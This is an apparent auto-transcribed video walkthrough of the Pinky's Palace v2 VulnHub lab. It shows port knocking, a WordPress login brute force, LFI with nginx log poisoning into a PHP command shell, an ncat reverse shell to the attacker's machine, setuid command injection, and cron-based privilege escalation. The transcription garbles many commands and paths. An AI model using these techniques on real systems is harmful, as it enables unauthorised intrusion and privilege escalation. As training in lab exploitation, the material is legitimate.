 what's going on YouTube this is if SEC and we do in pinky's palace version two from Vaughan hub I haven't done version one yet the reason why I started with Division two is simply because it's newer and more people are googling around for tutorials on it additionally with these worn home machines I'm gonna be doing less preparation and I'm also gonna be trying to learn new programs and techniques as I go along so you'll see me do a lot more mistakes and fumble around and these videos may be even longer than the hack the box machines no idea for this video I did it with like gdb yesterday today I'm gonna try to figure out how to use radar and get everything working with that tool so probably gonna give up and use gdb at some point because I don't know how to do debugging and radar will figure it out but let's just jump in enough talking we're gonna start off with a nmap scan so let's make the directory and run nmap - SC for default scripts as V enumerate versions Oh a output all formats and we'll call this all ports - scripts and we do all ports because well it is on my local network and the scan will go fast I can also specify - capital T 5 because again on my network and it goes fast and then the IP address of pinky which is 170 - 1610 139 since can be finished in a second and then once it does that it will do the probably HTTPS key and if port 80 or something is open so take another second for this to finish I could have also done - V so it showed open ports as it goes but again not gonna take too long here and as I say that it feels like it's taking a while ok there we go we do have HTTP open it looks like WordPress version 4 9 for Apache - 4 - 5 Debian if we wanted to we could see what Debbie and release this is just by a quick google so we can do debian Apache - I'm gonna have to Apache to just copy and paste that and let's see I am guessing it's gonna be packages Debian org English jeetu and we can see which versions of patchy ship with each OS of debian so like - - - - is wheezy - 410 is Jesse - 4 - 5 is stretch and that is the one we are on this is Debbie at 9 we have 249 Buster and 2 4 3 3 so I believe we are on stretch let's double check that - you're 45 yep so we have figured out which debian version we're on not that huge of a deal it could help in buffer overflows or things like that down the line but really does help just good to know exactly what your host is in case you're trying to mimic it we also see a few things that actually it says open TCP wrapped let's run that again without scripts and just see exactly what that output is so get rid of all that and see I think this says open because of the script scans I'm used to just saying a filtered but we can see this TCP wrapped or filtered and this just means and that can't determine if it's open or not so if we open up wireshark we can explore this behavior so let's see get this lined up zero okay so we can do a nmap - P will say four six five four this should come back closed 139 we can stop this capture and we see we send this syn packet out and we get a reset and act immediately from the server we can see the destination port here is four six four five and then the source port it's coming from is four six four five on the server so we know that this is a blocked port just because well the server told us that this port is not open let's try and run that scan against one of the ports that is marked filtered and see what happens so that is four six five five and we can see we don't have that little red line the server doesn't respond to us at all we just have us and then us trying to connect to it again so we send this in we don't get anything back my Maps noticing that's odd behavior because all the other ports sent us a reset back or reset ACK which means the port is blocked so that's why nmap they're saying these ports in particular are interesting because they behave in differently so can't really do anything with that information just wanted to point that out maybe later we will in this machine let's just go to that port 80 to see what is happening on that address we know it is WordPress so once we 216 10 139 we have AB lot of content screwed up and that is because WordPress likes putting full links in everything so we see it thinks this website is HTTP colon slash slash pinky DB slash WP content and obviously we can't resolve this because it's not a full host name so we're gonna fix that by just putting something in the host file so Etsy host once three to 1610 139 binky DB and this also tells us what the host name of this box is because we assume when the administrator is going to this box he's by doing the host name and when you don't have a full domain name you have to specify HTTP and Firefox and my burt probably should be reset or something because there's some cache issue going on I know his book doesn't really like changing the a change in the host file immediately so disable the proxy and then try this they're a type of that know maybe Firefox doesn't like changing the host file immediately let us just go to privacy and clear everything privacy clear recent history everything is cleared and we'll see if this does anything not will restart Firefox nope it is Firefox maybe it's not purposeful maybe it's always Firefox we do see WordPress is open so let's run a WP scan against it so we'll make a directory called recon and go into this and do to P scan - H to see all the options we want to do a piece can - - URL what if we specify HTTP or not it's not saying HTTP and the help so just gonna do - - URL pinky DB and see what it does well do - - enumerate and I want to do plugins themes users and temp thumbs not exactly sure what that is but let's enumerate everything and there should be a right to file option I which was near the bottom example version of a purse I just thought it's log I think - - log so - - log will say die piece can pinky that should be it for Doug piece can update you may want to click yes I'm just gonna do now well that's going let's do go Buster so opt go Buster go Buster - you pinky DB - w-4 word list user share worthless dirt Buster directory list - 3 and were the options we'll do medium and threads 4200 again this is local so we can put it on full blast and I want to save this output so I'll do pipe it to tea and do go Buster dot log I think there's a - a flag Buster or something so let's look at this output first see if we have anything of note my machines definitely slowed down since I did go Buster at 200 threads nothing really we can see the theme was updated in 2017 WordPress is 2 4 that's the header of that would press version four nine four we could check Google and see when that got released and the same Tim some files nothing user named pinky leet and that's about it looking at the go Buster output we do see a slash secret and I think I'm gonna control C this because it's just slowing down one machine but let's go and see what is in slash secret and we have bambam text three numbers and pinky DB so these are all port numbers and it's popular and Vaughn hub to do some type of port knockin your box so that's why I went to port knockin right away from seeing these numbers and I don't know what this pinky DB is here maybe it's a hint at what the hostname is but we figured that out through WordPress it's kind of odd there wasn't any information on that WordPress page so we'll just throw that in our back pocket because normally creators won't put something out there that just doesn't exist or put something out there for no purpose whatsoever there is a slash WordPress directory on that so let's just check that out before we go and create the port Knox script so if we do pinky slash WordPress and we can potentially create something so if we click lets go and get the username password this database we may be able to set up our own WordPress instance and if we do that then we'd be able to where's si just own the server because we'd be admin then we could potentially write a theme we could also set the database host to us so let's see if I have my sequel running do I haven't installed my sequel D status my sequel status I do have my sequel installed so let's actually try that real quick before we do this port knocking stuff so it's took my sequel with service my sequel start and then let's log in with my sequel - you root - P guessing root tour let's just get rid of that - PFLAG and okay no default no pass one of my SQL instance on my box may want to fix that but it's not a problem for now let's do create user hip sack at pinky DB identified right by will say please subscribe created that user and this app means the user upset can log on any but uh can log on from this box so I could do % if I want say upset can log in from anywhere but with just at pinky DB if ii only log in from pinky DB and by default routes probably set to localhost so you can't just connect my box on port 3306 and with no password and get in probably grant all privileges on we gotta create a database great database pinky and now we can grant all privileges on pinky and the dot store means all tables too hip sack at pinky DB we can do flush privileges and now we should have a user called a p-- sack with the password of please subscribe so let's to database named pinkie tips AK passwords please subscribe host 172 1610 168 I think I am if config 0 168 ter prefix doesn't really matter let's see if we get anything using a password so couldn't connect let's see netstat dash l v NP grabbed 3 3 or 6 it's only listening on localhost maybe let's see we can do Wireshark and we'll see what happens so go here try again submit stop this see the post we see it connecting to us on 3 306 and then us just immediately stopping it so we have to change my sequel to actually have that port open so iptables - capital L everything is gone except so maybe this is Etsy my sequel Maria DB Kampf maybe my comm I assume let's see nope not sure exactly where this configures it tells it where to listen my sequel comp not there so it's good at C my sequel grab one 27001 dot there we go it's probably in Moorea DB comp d50 so we got Kampf 127 let's change this to zero zero zero zero really bad idea but for the purpose of this video let's do it nice to it that's that LVN P grep for listen on three 3:06 now we see this isn't one 27001 so we should be able to potentially connect yeah it's listening go sorry but it can't create wp-config.php so all that work for absolutely nothing dead end here because in order to install WordPress it needs the Apache user needs right access to this WP dash admin folder and it doesn't have it so can't complete this installation but it was a fun rabbit hole to go down let us go on with that point knocking script so as a reminder the port knock was in pinky DB slash secret bamm-bamm text so let's create something I will call it octopi and we are going to use SCAP e so from SCAP e dot all import star this is just like pythons tcp library there's all things not TCP packet Network all things network related Scapa does I guess and we're also going to undo from inner tools import permutations and this is just going to make it really easy for us to do all possible combinations between those three ports so we can show that off with ports equals a list so put the three ports there seven thousand eight eight nine oh seven thousand six six six four ports and four mutations ports so if we print this we can see it does all potential combinations I should make this Python 3 let's see same code sweet so what we have to do now is do 4 port and ports we're going to do something with each port so we're going to want to create a function called it's an packet and we'll give it two arguments IP and port and we gotta create this IP packet this is all gonna be within Scapa code so the first layer is the IP and we're gonna specify the source address which is going to be me 172 1610 168 and then the destination address which is going to be them and we're defining it within that with IP next line I'm going to call this create a layer for sin and that's going to be TCP so we're creating the TCP layer we're calling this sin because all it is is going to be a syn packet so s port is equal to we'll say all sevens we hit the jackpot d port is equal to port flags we got specify capital S for sin and sequence number we'll do 1 2 3 4 5 just general layers in the TCP packet and it can send IP sin so now we can say send packet to the IP once 82 1610 139 and then the port so this should send a syn packet to all potential combinations of those three ports and that's essentially how port knocking works puts appear to be offline until a magical knock happens and once that magical knock happens then it magically comes back online so let's do an Matt see cat and Matt all ports this and we see 4 6 5 5 was most closed so P 4 6 5 5 always marked filtered I should say was a 172 1610 139 and it still filtered so let's run our script a few times for I n SEC 1 3 we'll run the script three times port knocking itself isn't really a science so see if that works still closed that is odd then knock let's see ports are there let's print [Music] port-au-prince so that one that should do it I may have a typo somewhere let's do this nmap again still filtered let's see does it not like that for source port 4000 that may be fine run this again still says filtered huh let's import a sleep maybe hitting it too fast so from time import sleep send packet and we will sleep for one second so we just hit poets seven thousand six sixty six and eight eight nine zero let's verify that all three of those are on this seven thousand six six six eight eight nine zero okay hit this again still says filtered map - P - are they all filtered yes they are let's see there's something wrong in this so let's want to shirk this make sure it's a sin packing I'm sending see and stop this so I sent that then I sent that and then I sent this we can see it is a syn packet the very first layer this IP layer my destinations that let's double check my IP I'm pretty sure it's that's correct my IP is correct huh let's try hitting it with netcat so netcat 172 1610 139 seven thousand six six six eight eight nine zero and then we can add map it still says filtered so I'm gonna reboot the host just in case something happened and then try it again my host has been rebooted so let's do this again we'll just use my for loop which does it three times and we'll check I guess I got rid of the sleep but let's see I map - pee - still says they're all filtered let's try one last thing I doubt this is the case but this guy could be incredibly mean so let's create a new thing called des port and we'll just do IP port again now we need to import socket and we can probably do this all here so sock is equal to okay so what I'm doing now is I'm going to test if the port is open after every loop because it is possible that there is a port doc which closes everything so we could be opening the port up and then closing the port so those are equals suck connect once mate - 1610 139 and we'll chest port elite stood out to me this is just one of those ports that was filtered and I actually remembered specify that elsewhere so I'd be pour it and then we can say if I don't know what the results are so we'll just return this and print it out so after every successful loop let's print test port and that is going to be 172 1610 139 and for elite and let's run this again see what happens I can't code that's what happens let's see I should have sent a timeout I figured it would just get like oh it's knocking this in reset because this is one of those darn port knocks and it doesn't send the reset so it has to timeout how do we make suck its timeout let's check let's just do sock timeout one see if this works maybe has no attribute timeout let's do octopi ipython I don't do three oh well should be the same input socket this socket [Music] see send set timeout that's what it is exit set timeout there we go and we see it returns something different right here after the very first one it returned a one so let's just send three packets with that because I think this one is actually with the one that may close it so let's test this out real quick comment this all out we want send packet and it was seven thousand six six six eight eight nine Oh execute this and map - P elite 172 1610 159 it is open and then what was that very next packet let's verify that your assumption is correct that this one closes it so reverse these two numbers eight eight nine oh six six six so port is open on this knock port is still open seven thousand eight eight nine oh six six six I thought it wouldn't want to closed let's try that again nope I'm not sure why the suck it's not closing anymore but that fixed it whatever we did I guess testing the port just fixed it doesn't really make sense but it's just on this again it is open from this whole script again see if it shuts down if it doesn't I met a loss poor it's this place on three I think line 22 what did I do oh crap four ports import send packet 180 to 1610 139 and port yep I'm at loss exactly what happened but it looks like zero means it is open so what was the very first result up here the very first result is looks like a weapon which I'm guessing is closed maybe it was one and just print twice and then after that it went completely open so zero must mean open that was an annoying thing I really hate anything related to port knocking so we can move go busting log into the Recon folder and let us begin with doing a nother end map so we do and map - SC sv we can do all ports they won't really matter and then Oh a for output all formats and map post knock and then the IP one say into 1610 139 t5 I think that's it run this and this should take probably 15-20 seconds to complete and we'll find out what all the other ports are so it's doing the service scan now and it's done so let's see that's interesting Elite printed something welcome to demon or daemon this is soon our back door and a pinkies place and we treated it like HTTP it looks sending the options that's just the banner NFL we got nginx on port seven six five four SSH on port four six five five actually saying Debian 10 we wrong by that Apache to four to five oh I really hate Debian naming convention Debbie and ten plus dead nine it's either Debian nine or ten I'm guessing that stretch but yeah I can't be more complete using so let's check what is on nginx so seven six five four thank you DB seven six five four we get a login prompt and pinkey database login it right off the bat says invalid username a password looking at the page source don't really see anything so let's send this over into a repeater and try a few things so username admin password is password click login and this up dawn admin password and this to the repeater tab nothing there we still see invalid username or password we can try pinkie leet invalid using a password pinkie nothing there let's check something real quick let's go back here see if we can enumerate user names so turn intercept off see root not found pinkie DB / root not found so okay I want you if we could enumerate user names through trying to go to home directories doesn't looks like we can so let's go back to the repeater we can try for one equals one nothing there so let's just send this over into SQL map and then try some other things so name this tab recon back here just copy this I'll get requests the blank spaces you could do copy the file I didn't feel like dealing with the file dialogue that pops up and going into this directory so let's go map - earth for request file we can say level 3 risk 5 I always get these two confused risk must be one two three level five risk three okay I think there's a batch flag I can actually do that we'll make it so it never prompts me for anything so I will see if that just works well that's going let us go back to that WordPress page because as I said it's odd for the WordPress page to be there and have absolutely zero purpose so what I'm going to do is I'm going to run cool against this and scrape all the woods we have multiple languages so it could also be a hint cool and then specify URL so HTTP pinky DB - M will say the past was at least six characters probably - right wordpress - pw and we have a nice word list here so let's go into a recon folder and doesn't look like my WP scan actually wrote anywhere nope was it a map when I wrote that nope so I guess however I did the log option dumpy scan decided not to save it where I wanted to save do I have that here - dialog that's a volatility thing it was in this window that's doing sequel map log there we go Doug peace can - pinkie let's do update dB okay JEP scan - pinkie and its end ugly scans home folder amazing we can look at the results and we do have a username at pinky lead so let us just on a whim great users will say pinky Lee pinky root and guest and pinky DB just because pinky DB was caught out after the port knock okay so we can now do the Hydra request against this web server so let's look at the options that is quite a bit see I think I remember how to do this Hydra - capital L because we're gonna specify a actual file location specify a single user and - capital P same concept what I say the password as dopey - pw i think then we can specify the URL which is pinkie d b 7 6 5 4 it is the HTTP POST form plugin like other options are ssh ftp have to be it gets up by URL write specify HTTP sends a specified FTP and all that stuff okay then we have to give it the actual page so going in to burp it is slash login dot PHP then we can do a colon we pass it the user and pass variable so user equals carrot user and that carrot just means pull it from the user file and pass is equal to pass that should be it and then the final step is something on the page that doesn't exist on a successful login so invalid username and valid username should be it and I have a failure so let's see in a valid target definition I get rid of this port does it work is it a port thing please don't be a poor thing ok it's not let's see what did I screw up in valid target definition okay doesn't one HTTP my gut was correct that's odd seven six five four okay see if Hydra actually goes and cracks it zero passwords could not resolve the address pinkey DB seven six five four Hydra - age crap - hi port - s maybe - s seven six five four okay so Hydra doesn't like the port in the URL and kind of few so root WordPress guest WordPress let's test those out real quick that first one I recognize I didn't recognize the other ones so yeah there's a valid I guess after a valid login kind of session cookie or something and kept going was like capturing no I was not oh well let's try the very first result pinky and passion pinky - Shaun and we get a login the thing to note right now is we get page gap PHP question mark leet is equal to file self I don't something more than one dot PHP so this execute some PHP thing we can look at Stefano's RSA which is a ID or s a file and notes on who Stefano is he's an internal web developer they created a RSA key for him so let's download this will make this directory nginx and cruel - OH Stefan oh stop that right dot key so we do see it is a encrypted key so I had ignored that and this is my mistake if you remember or pay to attach my Twitter I tweeted something out saying asking if something was broken this is about the step where I thought something was screwed up so I went ahead and fuzz this leat thing to try to get code execution so this looks like a lfi vulnerability the very first thing I did was HTTP let's just send this to Bert it would be easier what was it this Roxy history send nope that's not it this is it so the very first thing I did was try send something to me so HTTP 172 1610 138 and we'll listen on port 80 if we get a callback we have our RFI remote file inclusion and we don't so my next step is to do at C passwd and we get something we get the passwd file so we could keep doing a bunch of ofis or we could switch to let's say PHP was it filter convert dot base64 - encode resource is equal to that's a slash man Etsy passwd and all this does is makes the output in base64 form the reason this is useful is because then you can do things like grab those PHP file so we can do verb dub dub HTML WordPress dopey - config dot PHP it's not the location let's see is it for a dub dub Apache Apache - is it dopey is it - config we still have that here WordPress config file type II - config dot PHP oh it wasn't in the WordPress directory for dub dub dub HTML because we couldn't write to the WordPress directory let's try Apache get rid of HTML put HTML here and there we've finally found the location of where Apache is storing its root directory if we wanted to we could have probably also done like Etsy was it Apache to Apache comm for something and enumerate it based upon where the Apache config file is I can't remember off the top my head where it is on Debian oh I'm on debian ubuntu debian fine slash Etsy grap patchy Kampf that's the Apache to Apache - Kampf so if we wanted to we could have done that so we could have put this anyone call this he's 64 Etsy apache2 pachi to calm that youtube.com grab the config files out of here let's see it's white document root or something ver dub-dub-dub see two matches so probably grab sites see badger two sites available zero zero zero default we can try this one again pen testing is just knowing a system better than the sysadmin so don't go all config files it saved is incredibly helpful so there we go we got the document root that way you can do the same thing with nginx which i think is running on port 75,000 something but that's how I got the Apache directory initially is through a numerating it that way if we just try to include a PHP file we don't get anything and that's because it actually tries to execute it so that's where they base64 comes in handy so make the Apache Dobby config dot PHP dot be 64 pace that basics for - d/p config dot PHP and it didn't copy all of it let's see I think let's just call this copy a school command they're not like that copy 64 - d don't get an error there okay I guess it was in my copy fool but never get that WP config and we could also get more usernames from this so we know pinkie WordPress is the WordPress user pinkie DB pass underscored WP and if you did this with the nginx you could probably find more keys you may also be able to generate a wordpress cookie with just all these secrets I'm not sure if WordPress has updated I haven't tried it lately but that's another task because if we had actually one last thing to show and then we can go to cracking that RSA key so do all that PHP filter stuff is beyond what you have to do because if you'd look at like ver log was it Apache access log Apache to httpd get ready to log for log Apache to access not log this file could be too big from the door busting to actually read it we can check errant log so these logs may have gotten too big let's see log access start log should be a lfi word list we can test github lfi word list that has a bunch of useful things that test with lfi cyclists may be a good one web shells miscellaneous fuzzing maybe those to see what is this patchy to patchy logs could be beneficial to use this in a robust against that let's see for log access log let's see I access anything is it messages in Debian make sure my request is still good that's the passwd that works for log engine X log X access log try engine X waiting okay so we can read the engine X log and it is huge if this file gets too big then you potentially can't read it and we look we have a user agent here so we could just specify our user agent to be let's see PHP echo epic rocks and if we get the actual ape sack rocks without all this PHP we know we executed code so hip sack rocks see did we get anything stupid Burt can't tell test go oh I just gave it invalid code that wasn't valid PHP and now that log is dead that is awesome era log suite we have this we can try again let's see I don't know where I cleared that era let's see I think I needed parentheses around echo no I actually don't know where dared out that's odd can that do it maybe I did I don't know it didn't like something because now we get that big error message so here it doesn't look like we're outputting that is annoying if I away from Burt go back still there we have it completely there we go let's see failed opening ver log messages for inclusion on this line tool so what if we can now just put instead of it in the user-agent we can do something like phpinfo a command I know this won't screw up and we have to you Orlan code this that one okay let's see if we did that note we get internal server error so I'm actually going to fix this so we can demo this thing because something went bad so I'm gonna figure out a way to fix this and then we will resume the video so I think I figured it out let's refresh waiting come on I have to do the port knock again because I rebooted it was it and see you let's just go back to there this knocked up I you wanted three ports so let's see should do it to get that IP back up come on there we go so that was just me doing the port knock because I rebooted the box what actually happened I'll copy one of these log lines out because I didn't know this we I think we can show it so if I do test and quotes on this access log on nginx see do I see me do you see me let's do it like this looking at the server logs it had encode of those quotes and hacks so let's see if it did that yeah so I just can't see the request I'm making so there was my last request and there's double quotes got encoded and backslash X 22 which is the hexadecimal for double quote I'm guessing we do that again we should see the one with it in the middle so it was PHP and then had that as the escape so one of you doing this type of thing on nginx make sure you test your characters to you and show you're not putting bad characters in so do this twice so we can see if it encodes a single quote it does not so in a PHP script we're going to be using single quotes so we can do echo PHP echo if Zac rocks semicolon please don't screw this up again do this twice and we can see it check rocks got put in not the PHP or echo so we have this completely with command and execution so if I go to my op shelves I can do PHP Cat CMD dot PHP we can paste this make sure we don't have any double quotes there's a single quotes already that is good and here goes nothing let's say nginx likes all these characters so in get rid of that make my users agents something else and we have to say and it equals we can do any command we want so we'll do Who am I and we can see we got output of that command so we have full command execution to make things a little bit easier I'm going to send this to a post request or is it change request method click go again don't get anything so I think this is a get variable and the weird thing about post requesting is still through the get variable up in the URL and they have to post down here and it should happily work yep so we can now do let's see if is equal to which end cat to see if it has n cat on it and cat is as - E which makes life really easy and we do have it right here we probably should have put something in the PHP thing that said like if Zack rocks here's the command because all the command outputs always gonna be down here and it can be hard to find eventually but we do have an cat so n cat should make it really easy if we just do n cat - e then Sh once any 216 138 and port 9000 one go back to a shell and Cl VMP 9001 click go we'll 168 I think there we go we get a call back now we can do Python C and p2 y bt y dot spawn Ben - CY I wrong - echo foreground that and now we have the web shell for WWE data and this would I had and this is where I thought something may have been broken because if we do an LS - la on slash home we see stéfano if we go in his directory has tools do an LS - la and we got this Q sub binary that is oddly owned by www.pit.edu affordable it's oh we can't read this binary so we try to cat this Oh No cat works we just can't execute it weird that it extra whoops oh if I can around my channel tight 256-color there we go now we got clear so yeah link permissions are heard don't exactly understand what's going on there but since I couldn't execute this that's why I thought something may have been awry however if you remember and we avoided doing all this lfi stuff and just went to stefanos RSA which we have saved already on a box call this shells no that was an annex I think Stefan dokie we could try cracking this so let's do that copy the file over to my cracking rig and then shn and we can use John to crack this because I don't think hash cat actually cracks SSH keys now to huge John fan this is one of the few times I actually use it so in my John run directory I have SSH and g2 John there is a program on Kali that is SSH to John I think this works for regular John and SSH ng is for jumbo John the difference between the two being probably regular is CPU jumbo is GPU support there's a hundred percent positive but I use SSH ng if one doesn't work try the other that's generally the rule so we can move that to route Stephano keyed hash I guess we're not Pasha okay crack not sure exactly what to call that but Paulie John would be the best format and then we can run John against it so dot slash John root Stefan okie crack we use the rock you would list so word list rock you txt and let's run this and we already have the format craft as secrets with the Z 101 so we can switch back to my shells actually shells and split the pain and SSH - I want to save that it's nginx SH - RI Stefano key Stefano at 172 1610 139 Port refused we have to look at the end map and map per stock and map we have SSH on port 46 55 so unprotected key file we have to chmod it to 600 password still in my clipboard awesome passphrase and we login so now we can go to the home directory go into pinky Oh No Stefano go into the current users home directory and just go to tools and now we can execute this Q sub program if we look at note it says pinky made me this program so I can easily message him and if we do dot slash q sub some message and password and correct passwords so we have to do some reversing right now let's go into sh tab get rid of my password cracking we can say the P W we'll just rename this nginx folder to Stefano key so let's SCP Q sub to us so scp-172 16 10.1 39 and this is a - capital P and the port was I think 46 55 and tools Q sub to me and we specify it Stefano and - I Stephan okey it actually didn't let us copy that file let's go back to shells just because we don't have read access but we can buy basic C for it q sub permission denied let's just grab it through HTTP so if we go here Oh Stefano Q sub wonderfully could actually go from WWD da and base64 q sub yeah we can sweet so as W double you w data we can run base64 against that to copy this file off copy everything let's go here make 2 or e and we'll do VI q sub dot be 64 paste the base64 base 64 - D Q sub Q sub make that executable and we can execute it and we see the same message we saw before so we could just right off the bat try to cheat and do like an L trace on it and we do Q sub test and put password and right before that is doing a get environment on term if we enter some bad password we see a string compare against screen and if I do a get N and grep for a term or not get em if I just do N and grab for term I see my terminal is set to screen so we do a test input password screen if I could type of correct we could see then it fails to create a message so we go back here we could create a message Q sub test and try screen again and it submitted but if we wanted to actually do some reverse engineering we can load it up into radar I'm going to do dash D so we can execute it eventually and you do Q sub test very first thing radio usage it's gonna look like alien but it's very simple if you do question mark you got a bunch of things like a means analysis commands so you can do analysis and then question mark and then I see other things I can do a a question mark I can see triple a analyzes all the things so that's why I run first then you got like a P command P is for print now you got a bunch of peas you can do px to print hexadecimal you got the D command D is for debug DB breakpoint commands DB question mark can see a bunch of things then you can see DC is a continue execution and you can see continue execution up until a lot of different things which is very useful continue until return continue until execution of all children etc that's something that gdb doesn't really do is have a lot of those continue until things that makes greater a nice and debugging but we can do vvv to enter visualization mode we can see all the functions here how good a sim main because this is where we start i hit G to go and G again and then we can hit P to cycle different view viewing modes and you can see the commands it's doing right here like pxw at main pxx at main PXA PSS or you can hit capital v and jump into this graph and this is where I really like radar so we can analyze what's going on so we go into main stir it here and we're doing something right off the bat and this is the message so percent s that's probably gonna be Q sub message whatever so if we go back to a shell and do dot slash Q sub without anything we can see that usage so right here we're loading EDI which is gonna be the number of arguments and if that is not equal to one then print this I think it's not equal we can test if it's not equal by doing - okay so if it's less than one is when it does that print statement so we know that so if we give it one argument we go down here we're going to load the string term into ODI and we can see this since we did AAA I think it automatically put a memory address and gave it a name and we can see its contents as te or m and that is the memory address of it so if we had exited this I think I can do a semicolon desi commands now but I bet if we did a px at that address so I hit Q a few times px has to do that at sign we can see that variable so radar automatically just made that pretty for us so we loaded that and it's stored at this local underscore 8h then it asks us for the password and again automagically right here would be the phrase input password then we're calling we're loading another address and then we're doing a length check and comparing our ax local underscore 52 array X so I'm guessing this is going to be our input and to our ax and then we're going to compare that against this we're going to call STR Len and sto n is going to pull calculate the length of whatever's NRA RDI so early X is moving to our di and I think our di is the very first argument and 64-bit programs that's one of the different things between 32-bit and 64-bit is 32-bit you put a bunch of arguments on the stack and pop stuff off the stack I think that's a correct terminology and grab the arguments that way and 64-bit arguments go directly onto registers so calculating the length of our user input and if it is greater than 40 then we fail and it says hacker go away so let's do something that's greater than 40 so go down here python see print a times 42 a 40 or greater I'll try that so a message is for TAS we know the password screen questions submitted 41 is forty two ways something's not going Python deci print a times forty two dot slash q sub forty two A's oh that's not message password if the password is forty characters more print bad hacker go away sorry it's been a long video and we still got plenty to go so we know that then we go down here and we're loading two things local fifty H and we determined that was probably going to be a password and eight H which is all the way up here right around the environment variable so this is where it's doing that comparison and if you couldn't do all that we can also switch into debugger mood and this probably I'm gonna make mistakes so let's see we can do DB main to set a breakpoint on main let me do DC to continue until breakpoint and we hit the breakpoint I'm gonna do capital V data visualization mode and then we're gonna do P a few times to get into a mode we're familiar with and we could hit C and then tabs and then go here and set breakpoints if we wanted to we can also escape out of that do that again hit capital V get into this then hit P to change a viewpoint now we can see memory addresses let me set a breakpoint this way I'm sure there's hotkeys to actually navigate in these windows but I don't know them so I'm just going to copy this where the call is I'm going to look at RSI at RTI so break at memory address I think break at is when I do names nope I need you at I say Oh DB this is not gdb what is B display current block size okay DC and I should break right after I give it my password so we'll do it SEC for the password I hit a breakpoint I do PDF I can print the function I'm in and we want RSI and RDI so we can do px RSI we need app and we can see it's screen I think if I do px 0 it goes until it all by you now you can see that is screen and our di is IPSec and then I have to attack we have some dollar bytes so we can see that comparison there so that's how you do that one other cool thing about this is I was using PDF we can do PDF at main to analyze the main function if we do PD question mark we can see there is a pseudo dissembler output and see like syntax so we can do PDC at main and it will try to give us some C code if you don't want to read assembly which sometimes is very helpful and then we can see the be there and that's where our breakpoint is so let's go back into visualization mode and see what we wanted to do let's see so once we get the question submit we go down here and we go to the get you IDs set them and then send so we want to look at the send function so it's 2vv go over to send hit G twice capital V and we can kind of see what's going on so the send function is going to run bin echo % s this is where user input is and direct it to this file so if we do semicolon here we can probably get a command injection because down here we see it doing a call to system so now we know enough information to finally exploit this binary so let's do that we can go to a shelves and we could do dot slash q sub put this in quotes so it's all one argument we can do one we don't really care this is that bin echo we can do a semicolon touch slash temp owned then another semicolon and we can do Who am I and that can go through the direct so right now we just did bin echo and we echoed one does nothing then we did a touch on a file in temp and then we ran something a directed into Stephan a message Who am I so if we do this input password screen we see it submitted if we do it OS on temp we do - la we see owned and pinkey is the owner of that because of the set UID stuff so the way to take advantage of this is we're going to go into opt shells I have a set UID program I want to use exact dot C we will copy this go up here we can have Stefano create tab set UID dot C like it's that pay so it's pretty and the reason I did tab is because normally dev is sh m on debian is set to no seward so we can mount grep no suid and then grab sh m and we see no sticky bits or not sticky set UID bits are allowed on dev SH M so that's what I'm doing in a tab so we got sent UID dot C that's there which GCC is there so we should have everything in place to exploit this now so we can do Q sub 1 instead of touch owned we can do GCC flashed M show let's see I think I called it and then - o tab pinkie because pinkies who is going to own the file screen is the password temp show that C doesn't exist what is it set UID dot C okay we submitted it so we do LS dash away on temp we have pinkie we don't have the set UID bit yet set so let's do this again and do chmod plus s to set set UID on temp pinkie screen that L SLA again and now we have the set UID bit set so if we execute temp pinkie actually before we do that we can do ID and then execute em pinkie and do ID again we have our effective user ID as pinkie so now we can go into pinkie's directory and we can see messages if we can't messages will probably see pinkie twice cat it's a directory cat stéfano and we can see all the who am i is there's our age that we had sent earlier so we also have a Bosch history so let's look at that and we are editing backup SH and use a local bin so user local been VI backup Sh permission denied if we do an LS dash L a we can see daemon owns it pinkie is the group and we are pinkie but if we do an ID or a group is still Stefano so we have to find a way to get a group set to Stefan l the easiest way is just to do an LS - le and your home directory we don't have a SSH so I'm going to make - SSH then we're going to do pinky SSH - key gen - F will name this tip sec no passphrase on it and we can just cat hips tech pub and we can make a authorized key file so authorized underscore keys face to a public key LS - la we see pinky owns it we can see a smart that - 600 authorized keys and then go back to my box chmod 600 and that is that Sh key we just generated Shi yep sec pinky at pinky DB port was 46 55 I think for SSH and now we do the ID we have everything set we're UID pinky GID pinky so if we go to user then back up what was it cat bash history use a local bin we can now view and edit back up so we see we're doing a tour command to home demon back up can we look at that we don't have permission but let's just edit this so let's edit back up dot Sh and we will do GCC tab set u ID dot C - oh and this will be tap demon then chmod plus s see if that works and if we just look at this again Tom set UID see - oh that should be good and then just wait some time we could do the process monitor script if we go in for a log can we edit anything chrono look at Quran less doesn't look like it I don't know what the Cromwell guess that's weird V at C so we can go to like spool grande con tabs can't list anything there C D that's the carrot crontab nothing really there we could look at cond at whatever there's a PHP and con dot d so Gandhi grab PHP just cleaning up the sessions and periodically would just do LS - la on temp and see if any new files get created so I'm gonna pause the video cuz I know spoiler every five minutes so instead of goofing around for 90 seconds we'll just jump ahead so I think it's been time we can look I've got 10 seconds left almost guys that correctly so do it os - la on temp as long as I wrote that file correctly we should have something there and we do so daemon owns this shell execute this do an ID we're now very very long but we have effective user ID and group ID of demon or demin I don't even know how to say that we can go to his home directory there is that backup so if we do LS - la his bash history is to null so since other things were based upon user what I did was a find / - type F - user demon - Davin all so it looks like looking at all the files that are owned by this user and right off the bat we have slash demon or daemon panel so if we go to slash daemon do LS dash away we got a file not a set UID bit file if we do file on it it is an elf so if we execute it arrow button in a socket so it's doing something so let's copy this over to a box so panel yeah important have to do that we can just ask CP it oh it's that way yeah we own it so yeah that's just basics for it good being in the line space copy a bunch of things now we can get rid of all these shells and we can make a new directory actually we want it in the re directory the panel dot B 64 that's not the right clipboard that is a 64 dash D panel to panel chmod plus x panel and if we execute it it just hangs so we can netstat Al and P grab panel we see it's listening on port elite so this is that binary that was listening on a network socket that RN maps all that we haven't looked into yet you can NC local host on that port this is soon to be our back door so let us reverse engineer this binary now so let's get out of weight on this instance okay then we can launch radar and debug mode against panel and we do a a go in visualization mode we can look at main and see what it's doing so off the bat we have a fork and radar does not handle Forks grace doesn't follow Forks by default so if we want to follow that we'll have to set that option I think it's follow dot fork then we got Sukkot listen bunch of socket options that's binding here to bind listening we accepted a packet it looks like socket failed and here we go here's a string of everything that's happening so it's learning addresses that's the welcome to daemon so you can be a backdoor sending that all then we're going to receive the message and then call sim not handle command so let's go check what this is if we go to handle command what is that is that above yeah it is oops let's go back vvv handle command G twice capital V there we go so let's see what's happening we're adding RSP - 80 so that is 16 times 8 32 times 4 128 so guys we're creating a buffer size of around 128 bytes maybe I'm wrong there what that's doing and then calling STR a copy and STL n which is not the end version so there's probably a buffer overflow here so guess we can check it out one thing I don't do with radar is or do with both but gdb the check sack is nice and gdb so let's do that first pinky or a GED panel see what things we have on and I'm sure there's a way to 